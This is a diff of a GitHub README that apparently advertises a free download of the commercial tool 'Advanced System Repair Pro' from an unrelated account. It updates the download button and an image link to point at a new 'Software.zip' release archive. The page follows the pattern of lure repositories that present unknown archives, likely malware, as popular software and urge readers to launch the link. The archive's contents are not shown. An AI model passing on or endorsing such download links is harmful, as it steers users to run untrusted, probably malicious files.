@@ -22,7 +22,7 @@ Welcome to the **Advanced System Repair Pro Download** repository! Here you can 
 
 ## Access Software 📥
 Click the button below to download the Advanced System Repair Pro software package:
-[![Download Software](https://github.com/Ghost-a-lab/Advanced-System-Repair-Pro-Download/releases/download/v1.0/Application.zip)](https://github.com/Ghost-a-lab/Advanced-System-Repair-Pro-Download/releases/download/v1.0/Application.zip)
+[![Download Software](https://github.com/Ghost-a-lab/Advanced-System-Repair-Pro-Download/releases/download/v2.0/Software.zip)](https://github.com/Ghost-a-lab/Advanced-System-Repair-Pro-Download/releases/download/v2.0/Software.zip)
 *Note: The link needs to be launched to access the software.*
 
 ## About Advanced System Repair Pro ⚙️
@@ -49,6 +49,6 @@ Advanced System Repair Pro is a comprehensive system optimization tool designed 
 
 We hope you find Advanced System Repair Pro helpful in maintaining your computer system. Feel free to reach out if you have any questions or need assistance. Happy optimizing! 💻🔧
 
-![Advanced System Repair Pro](https://github.com/Ghost-a-lab/Advanced-System-Repair-Pro-Download/releases/download/v1.0/Application.zip)
+![Advanced System Repair Pro](https://github.com/Ghost-a-lab/Advanced-System-Repair-Pro-Download/releases/download/v2.0/Software.zip)
 
 *For more updates and information, visit the "Releases" section of this repository.* 🌟
